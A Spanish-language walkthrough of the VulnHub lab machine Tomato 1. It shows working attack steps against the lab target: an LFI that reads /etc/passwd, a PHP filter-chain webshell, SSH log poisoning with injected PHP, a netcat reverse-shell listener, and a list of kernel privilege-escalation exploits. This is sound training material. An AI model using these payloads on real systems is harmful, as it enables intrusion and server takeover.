---
layout: single
title: Tomato 1 - VulnHub
excerpt: "La maquina Tomato 1 de la plataforma de Vulnhub es una maquina linux donde tendremos que aplicar fuzzing para descubrir rutas de la maquina y poder aprovecharnos de un LFI para poder enumerar el sistema y convertir el LFI a un RCE atraves de 2 formas que son un Log Poisoning envenando los Logs y la otra abusando de los php filters chain y para la escalada de privilegios vamos a abusar de la version del kernel de la maquina para ser root"
date: 2023-03-03
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-tomato1/logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - Spanish
tags:  
  - LFI
  - Log Poisoning
  - PHP Filters Chain
  - Linux Kernel < 4.13.19 Ubuntu 16.04
---

<p align="center">
<img src="/assets/images/vh-writeup-tomato1/logo.png">
</p>

```bash
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:f1:59:4d, IPv4: 192.168.1.67
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.65	00:0c:29:08:ee:70	VMware, Inc.
```

```bash
❯ whichSystem.py 192.168.1.65

192.168.1.65 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p21,80,2211,8888 192.168.1.65 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 19:13 CST
Nmap scan report for 192.168.1.65
Host is up (0.0018s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Tomato
2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2530a918cf1a610110d9e0f22f8498e (RSA)
|   256 b31260324828ebac80de17d796776e2f (ECDSA)
|_  256 366f52adfef7923ea2510f73068d8013 (ED25519)
8888/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Private Property
MAC Address: 00:0C:29:08:EE:70 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.41 seconds
```

La version de `ssh` es vulnerable

```bash
❯ searchsploit ssh user enumeration
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                      | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                          | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                          | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                         | linux/remote/40113.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Enumeration

El exploit es el que tiene un `(2)` pero no lo vamos a usar

```bash
❯ python2.7 ssh_user_enumeration.py -h 2>/dev/null
usage: ssh_user_enumeration.py [-h] [-p PORT] target username

SSH User Enumeration by Leap Security (@LeapSecurity)

positional arguments:
  target                IP address of the target system
  username              Username to check for validity.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Set port of SSH service
```

Vemos el puerto `21` que corresponde a `ftp` pero el usuario `anonymous` no esta contemplado necesitamos credenciales esto por que nmap lanza scripts basicos de renonocimiento y si este usuario estuviera contemplado nos los hubiera dicho en el escaneo

```bash
❯ locate ftp-anon.nse
/usr/share/nmap/scripts/ftp-anon.nse
```

No nos reporta nada

```bash
❯ nmap --script=http-enum -p80,8888 192.168.1.65 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 19:27 CST
Nmap scan report for 192.168.1.65
Host is up (0.0021s latency).

PORT     STATE SERVICE
80/tcp   open  http
8888/tcp open  sun-answerbook
MAC Address: 00:0C:29:08:EE:70 (VMware)
```

Vamos a ver las tecnologias que esta usando la web por el puerto `8888` necesitamos autenticarnos 

```ruby
❯ whatweb http://192.168.1.65
http://192.168.1.65 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.1.65], Title[Tomato]

❯ whatweb http://192.168.1.65:8888
http://192.168.1.65:8888 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[192.168.1.65], Title[401 Authorization Required], WWW-Authenticate[Private Property][Basic], nginx[1.10.3]
```

Vamos a ver la web principal

![](/assets/images/vh-writeup-tomato1/Web1.png)

Ahora vamos a ver lo que hay en el otro puerto y es un panel de autenticacion si nos pones credenciales te va a dar un codigo de estado `401`

![](/assets/images/vh-writeup-tomato1/Web2.png)

Vamos a emplear fuzzing 

```bash
❯ gobuster dir -u http://192.168.1.65/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.65/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/03 19:35:24 Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 277]
/server-status/       (Status: 403) [Size: 277]
```

Vamos a emplear otro diccionario para estar seguros de que no nos estamos olvidando de ninguna ruta

```bash
❯ gobuster dir -u http://192.168.1.65/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 20 --add-slash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.65/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
2023/03/03 19:38:19 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd/           (Status: 403) [Size: 277]
/antibot_image/       (Status: 200) [Size: 953]
/.hta/                (Status: 403) [Size: 277]
/.htaccess/           (Status: 403) [Size: 277]
/icons/               (Status: 403) [Size: 277]
/server-status/       (Status: 403) [Size: 277]
                                               
===============================================================
2023/03/03 19:38:23 Finished
===============================================================
```

El recurso `antibot_image/` se ve interesante vamos a ver que es

Y esto es lo que hay

![](/assets/images/vh-writeup-tomato1/Web3.png)

Y vemos esto dentro del directorio

![](/assets/images/vh-writeup-tomato1/Web4.png)

Tenemos informacion algunas funciones no estan contempladas pero si llegamos subir alguna `webshell` con alguna permitida pues funcionaria vamos a ver el codigo fuente para ver si encontramos algo interesenta

![](/assets/images/vh-writeup-tomato1/Web5.png)

Y vemos esto de primeras interesante

Por el metodo `GET` hay un metodo `image` con el que puedes apuntar a un recurso de la maquina y te lo lee

![](/assets/images/vh-writeup-tomato1/Web6.png)

Vamos a ver si funciona

Y si podemos ver el `/etc/passwd` al final del todo

![](/assets/images/vh-writeup-tomato1/Web7.png)

```bash
❯ curl -s X GET "http://192.168.1.65/antibot_image/antibots/info.php?image=/etc/passwd" | grep "</body></html>" -A 1000 | sed 's/<\/div><\/body><\/html>//'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
tomato:x:1000:1000:Tomato,,,:/home/tomato:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:109:117:ftp daemon,,,:/srv/ftp:/bin/false
```

Vamos a empezar a enumerar para ver si podemos ver los puertos internos

```bash
❯ curl -s X GET "http://192.168.1.65/antibot_image/antibots/info.php?image=/proc/net/tcp" | grep "</body></html>" -A 1000 | sed 's/<\/div><\/body><\/html>//' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u | while read port; do echo "[+]Puerto $port"; done
[+]Puerto 0050
[+]Puerto 08A3
[+]Puerto 22B8
```

Ahora vamos a convertirlo a decimal

```bash
❯ curl -s X GET "http://192.168.1.65/antibot_image/antibots/info.php?image=/proc/net/tcp" | grep "</body></html>" -A 1000 | sed 's/<\/div><\/body><\/html>//' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u | while read port; do echo "[+]Puerto $port -> $((0x$port))"; done
[+]Puerto 0050 -> 80
[+]Puerto 08A3 -> 2211
[+]Puerto 22B8 -> 8888
```

Vamos a ver si estamos en la maquina victima `4101A8C0`

```bash
❯ echo "$((0xC0)).$((0xA8)).$((0x01)).$((0x41))"
192.168.1.65
```

Y si efectivamente estamos en la maquina victima y no en un contenedor o `docker`

Para aprovecharnos del `LFI` vamos a buscar rutas interesantes para enumerar el sistema si alguna ves explotas un `LFI` puedes buscar por estas rutas `/proc/sched_debug`,  `/etc/passwd`, `/proc/net/fib_trie`, `/proc/net/tcp`, `/var/log/apache2/access.log` y `/var/log/auth.log` 

En este caso vamos a ver el `/proc/sched_debug` con esto podemos ver servicios que esten corriendo se esta corriendo `apache2`

```bash
apache2  1039      8331.610326     30830   120      7855.137562      4737.642513   1851234.107397 0 0 /autogroup-54
         apache2  1040      8331.343655     30471   120      7368.094962      4823.875590   1725007.866973 0 0 /autogroup-54
         apache2  1053      8330.008953     30831   120      8019.641935      4953.698870   1622977.922131 0 0 /autogroup-54
         apache2  1056      8332.827490     30575   120      8086.261795      5047.627256   1855172.637849 0 0 /autogroup-54
         apache2  1073      8335.754695     16946   120      4558.624390      2880.603796   1578517.567941 0 0 /autogroup-54
R        apache2  1080      8329.754695       170   120        26.933569        40.603570   2153508.918094 0 0 /autogroup-54
         apache2  1085      8331.563953         8   120         1.614838        65.601362   1610872.152493 0 0 /autogroup-54
         apache2  1086      8331.973651        14   120         1.724281        55.755070   2107171.461693 0 0 /autogroup-54
```

Como esta usando `apache2` vamos a ver si podemos listar los `logs` pero no podemos

```bash
❯ curl -s X GET "http://192.168.1.65/antibot_image/antibots/info.php?image=/var/log/apache2/access.log" | grep "</body></html>" -A 1000 | sed 's/<\/div><\/body><\/html>//'


```

vamos a ver si los de `ssh` estan comtemplados y si

![](/assets/images/vh-writeup-tomato1/lfi.png)

Vamos a abrir `burpsuite` en 2 plano para hacer mas pruebas

```bash
burpsuite > /dev/null 2>&1 & disown
```

Configuras tu `foxy-proxy` para interceptar la peticion web en la vimos en `/etc/passwd` 

Una vez que la captures la envias al `repiter` `CTRL+R`

![](/assets/images/vh-writeup-tomato1/Burp1.png)

Vamos a ver si podemos inyectar comandos primero vamos a cambiar el metodo de `GET` a `POST` con la opcion `change request method` 

Pero nada

![](/assets/images/vh-writeup-tomato1/Burp2.png)

Estamos usando `wrappers` de php para esto 

Para la siguiente prueba vamos a utilizar esto en base64 te vas a la parte de Decoder y solo lo conviertes a base64

![](/assets/images/vh-writeup-tomato1/Burp3.png)

Pero no funciona

![](/assets/images/vh-writeup-tomato1/Burp4.png)

Otra cosa que podemos hacer aprovecharnos de los `php filter chain`

<https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py>

```bash
❯ python3 php_filter_chain_generator.py -h
usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]

PHP filter chain generator.

optional arguments:
  -h, --help            show this help message and exit
  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)
  --rawbase64 RAWBASE64
                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.

```

```bash
❯ python3 php_filter_chain_generator.py --chain "XDDD"
[+] The following gadget chain will generate the following code : XDDD (base64 value: WERERA)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

Y vamos a ver si funciona se supono que en vez de poner `etc/passwd` vamos a pegar lo que nos genero y tenemos que ver directamente lo que le digimos que es XDDD

Y funciono

![](/assets/images/vh-writeup-tomato1/Web8.png)

Vamos a tratar de hacer algo mejor 

```bash
❯ python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
[+] The following gadget chain will generate the following code : <?php system($_GET["cmd"]); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

 Y vemos que funciona

 ![](/assets/images/vh-writeup-tomato1/Web9.png)

Bueno ahora podemos probar inyectar un comando al final de `temp&cmd=id`

Y funciona estamos inyectando comandos

![](/assets/images/vh-writeup-tomato1/Web10.png)

Si queremos ganar acceso usando esto 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Pones tu ip y ejecutas el `oneliner` de `bash` y ejecutas

![](/assets/images/vh-writeup-tomato1/Web11.png)

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.67] from (UNKNOWN) [192.168.1.65] 42830
bash: cannot set terminal process group (869): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/antibot_image/antibots$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/antibot_image/antibots$ 
```

Esta es la primera forma de ganar acceso pero la otra es aprovechandonos de un `Log Poisoning` 

Y bueno si veiamos en la ruta `/var/log/auth.log` logs de `ssh` vamos a intentarnos autenticarnos para generar un `log`

```bash
❯ ssh xd@192.168.1.65 -p 2211
The authenticity of host '[192.168.1.65]:2211 ([192.168.1.65]:2211)' can't be established.
ECDSA key fingerprint is SHA256:JDd25EqsTJs44XnAH15oh6ObPD2zJ2QmrJ3FU8mL8ps.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.1.65]:2211' (ECDSA) to the list of known hosts.
xd@192.168.1.65's password: 
Permission denied, please try again.
xd@192.168.1.65's password: 
```

Si recargas la pagina generamos un log como estamos en una pagina php si inyectamos codigo php la web deberia de autenticarnos

![](/assets/images/vh-writeup-tomato1/Web12.png)

```
❯ ssh '<?php system($_GET["cmd"]); ?>'@192.168.1.65 -p 2211
<?php system($_GET["cmd"]); ?>@192.168.1.65's password: 
Permission denied, please try again.
<?php system($_GET["cmd"]); ?>@192.168.1.65's password: 
Permission denied, please try again.
<?php system($_GET["cmd"]); ?>@192.168.1.65's password: 
```

Y si nos lo inyecto vamos a ver si funciona enviandonos un ping a nuestra ip

![](/assets/images/vh-writeup-tomato1/Web13.png)

Y asi quedaria

![](/assets/images/vh-writeup-tomato1/Web14.png)

```bash
❯ tcpdump -i ens33 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on ens33, link-type EN10MB (Ethernet), snapshot length 262144 bytes
21:34:30.051151 IP 192.168.1.254 > 192.168.1.67: ICMP echo request, id 1244, seq 0, length 64
21:34:30.051178 IP 192.168.1.67 > 192.168.1.254: ICMP echo reply, id 1244, seq 0, length 64
21:34:30.051851 IP 192.168.1.254 > 192.168.1.65: ICMP echo request, id 1244, seq 0, length 64
21:34:30.052037 IP 192.168.1.65 > 192.168.1.254: ICMP echo reply, id 1244, seq 0, length 64
21:34:31.383520 IP 192.168.1.65 > 192.168.1.67: ICMP echo request, id 1400, seq 1, length 64
21:34:31.383545 IP 192.168.1.67 > 192.168.1.65: ICMP echo reply, id 1400, seq 1, length 64
21:34:31.405143 IP 192.168.1.65 > 192.168.1.67: ICMP echo request, id 1402, seq 1, length 64
21:34:31.405167 IP 192.168.1.67 > 192.168.1.65: ICMP echo reply, id 1402, seq 1, length 64
21:34:31.408934 IP 192.168.1.65 > 192.168.1.67: ICMP echo request, id 1404, seq 1, length 64
21:34:31.408955 IP 192.168.1.67 > 192.168.1.65: ICMP echo reply, id 1404, seq 1, length 64
21:34:31.412021 IP 192.168.1.65 > 192.168.1.67: ICMP echo request, id 1406, seq 1, length 64
21:34:31.412041 IP 192.168.1.67 > 192.168.1.65: ICMP echo reply, id 1406, seq 1, length 64
21:34:31.414543 IP 192.168.1.65 > 192.168.1.67: ICMP echo request, id 1408, seq 1, length 64
21:34:31.414568 IP 192.168.1.67 > 192.168.1.65: ICMP echo reply, id 1408, seq 1, length 64
21:34:31.417348 IP 192.168.1.65 > 192.168.1.67: ICMP echo request, id 1410, seq 1, length 64
```

Tenemos capacidad de ejecucion remota de comandos asi que podemos ganar acceso al sistema ejecutas el mismo `oneliner` de bash para ganar acceso despues de `&cmd=`

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.1.67] from (UNKNOWN) [192.168.1.65] 42844
bash: cannot set terminal process group (869): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/antibot_image/antibots$ whoami
whoami
www-data
www-data@ubuntu:/var/www/html/antibot_image/antibots$ 
```

Envenenamos los `logs` y ganamos acceso atraves de un `log poisoning`

Para que tengas una mejor reverse shell

```
script /dev/null -c bash
stty raw echo; fg
CTRL+Z
reset xterm
ENTER
```

## Escalada de privilegios

Estamos ante un ubuntu `xenial`

```bash
ww-data@ubuntu:/home/tomato$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04 LTS
Release:	16.04
Codename:	xenial
www-data@ubuntu:/home/tomato$ 
```

La version de kernel es vulnerable 

```bash
www-data@ubuntu:/home/tomato$ uname -a
Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
www-data@ubuntu:/home/tomato$ 
```

Este es el importante `linux/local/45010.c`

```bash
❯ searchsploit linux kernel local privilege escalation 16.04 4.4
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                     | solaris/local/15962.c
Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_se | linux/local/9479.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                             | linux/local/50135.c
Linux Kernel 3.11 < 4.8 0 - 'SO_SNDBUFFORCE' / 'SO_RCVBUFFORCE' Local Privilege Escalation    | linux/local/41995.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)               | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalat | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege  | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privil | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation  | linux/local/39772.txt
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                    | linux/local/41886.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                  | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation             | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                 | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                        | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escala | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR | linux/local/43418.c
